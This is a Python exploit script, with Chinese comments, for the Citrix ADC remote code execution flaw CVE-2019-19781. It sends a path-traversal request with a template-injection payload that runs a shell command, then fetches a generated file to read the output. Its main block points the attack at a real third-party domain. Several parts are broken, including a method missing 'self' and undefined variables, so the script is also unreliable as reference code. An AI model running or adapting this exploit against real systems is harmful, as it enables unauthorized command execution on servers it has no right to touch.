#!/usr/bin/env python3

'''
name: Citrix ADC远程代码执行漏洞
description:  Citrix ADC远程代码执行漏洞,可执行任意命令
'''

import uuid
from app.lib.utils.request import request

class CVE_2019_19781_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.cmd = 'whoami'
        self.cdl = str(uuid.uuid4()).split('-')[0]

    def xml_url():
        xml_url = self.url + '/vpn/../vpns/portal/%s.xml' % self.cdl
        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'NSC_USER': 'nsroot',
            'NSC_NONCE': 'nsroot'
        }
        req = request.get(xml_url, headers = headers)
        if req.status_code == 200:
            print('Xml_Url=', xml_url)
            print('Command=', cmd)
            print('Exec Result:\n%s\n' % req.content.split("&#117;")[0])

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            newbm_url = self.url + '/vpn/../vpns/portal/scripts/newbm.pl'
            headers = {
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
                'Connection': 'close',
                'NSC_USER': '../../../netscaler/portal/templates/%s' %self.cdl,
                'NSC_NONCE': 'nsroot'
            }
            payload = "url=http://example.com&title=" + self.cdl + "&desc=[% template.new('BLOCK' = 'print `"+ self.cmd + "`') %]"
            req = request.post(url = newbm_url, headers = headers, data = payload)
            if req.status_code == 200 and 'parent.window.ns_reload' in req.content:
                print('存在CVE-2019-19781漏洞,上传的文件为:', newbm_url)
                self.xml_url(url,cdl,cmd)
                return True
            else:
                print('不存在CVE-2019-19781漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在CVE-2019-19781漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2019_19781 = CVE_2019_19781_BaseVerify('http://baidu.com')
    CVE_2019_19781.run()
